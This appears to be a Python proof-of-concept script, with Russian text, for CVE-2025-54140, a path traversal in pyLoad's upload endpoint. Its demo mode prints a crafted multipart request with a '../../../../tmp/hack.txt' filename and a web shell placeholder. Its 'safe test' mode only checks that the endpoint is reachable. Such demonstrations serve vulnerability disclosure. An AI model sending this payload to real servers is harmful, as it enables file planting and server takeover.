
import requests
import sys
from urllib.parse import urljoin

def print_color(text, color):
    colors = {
        'red': '\033[91m',
        'green': '\033[92m',
        'yellow': '\033[93m',
        'blue': '\033[94m',
        'reset': '\033[0m'
    }
    print(f"{colors.get(color, '')}{text}{colors['reset']}")

def show_banner():
    print_color("""
╔════════════════════════════════════════╗
║  CVE-2025-54140 - PoC                 ║
║  Path Traversal in pyLoad             ║
║  Только имитация! Без вреда!          ║
╚════════════════════════════════════════╝
    """, 'blue')

def show_help():
    print("\nИспользование:")
    print("  python cve_poc.py <URL> [режим]")
    print("\nРежимы:")
    print("  --demo     - показать эксплойт (без отправки)")
    print("  --test     - отправить безопасный тест")
    print("\nПример:")
    print("  python cve_poc.py http://localhost:8000 --demo")
    print()

def imitate_attack(url):
    """Показываем как выглядит атака"""
    print_color("\n[*] ИМИТАЦИЯ АТАКИ", 'yellow')
    print("=" * 50)
    
    endpoint = urljoin(url, "/json/upload")
    malicious_file = "../../../../tmp/hack.txt"
    
    print(f"Цель: {url}")
    print(f"Эндпоинт: {endpoint}")
    print(f"Вредоносное имя файла: {malicious_file}")
    print("\nHTTP запрос:")
    print(f"""
POST {endpoint} HTTP/1.1
Host: {url.replace('http://', '').replace('https://', '')}
Content-Type: multipart/form-data; boundary=---PoC

---PoC
Content-Disposition: form-data; name="file"; filename="{malicious_file}"
Content-Type: text/plain

#[здесь может быть web shell]
---PoC--
    """)
    
    print_color("\n⚠️  РЕЗУЛЬТАТ: Файл сохранится в /tmp/ на сервере", 'red')
    print("Это может привести к полной компрометации системы!\n")

def safe_test(url):
    """Отправляем безопасный тест"""
    print_color("\n[*] БЕЗОПАСНЫЙ ТЕСТ", 'green')
    print("=" * 50)
    
    endpoint = urljoin(url, "/json/upload")
    files = {
        'file': ('test.txt', 'CVE-2025-54140 test', 'text/plain')
    }
    
    print(f"Отправка на: {endpoint}")
    
    try:
        response = requests.post(endpoint, files=files, timeout=5, verify=False)
        print(f"Статус ответа: {response.status_code}")
        
        if response.status_code == 200:
            print_color("✅ Эндпоинт доступен!", 'green')
        else:
            print_color("❌ Что-то пошло не так", 'red')
            
    except Exception as e:
        print_color(f"Ошибка: {e}", 'red')

def main():
    show_banner()
    
    if len(sys.argv) < 2 or sys.argv[1] in ['-h', '--help']:
        show_help()
        return
    
    url = sys.argv[1]
    
    if len(sys.argv) == 2:
        imitate_attack(url)
    elif sys.argv[2] == '--demo':
        imitate_attack(url)
    elif sys.argv[2] == '--test':
        safe_test(url)
    else:
        print_color("Неизвестный режим!", 'red')
        show_help()

if __name__ == "__main__":
    main()
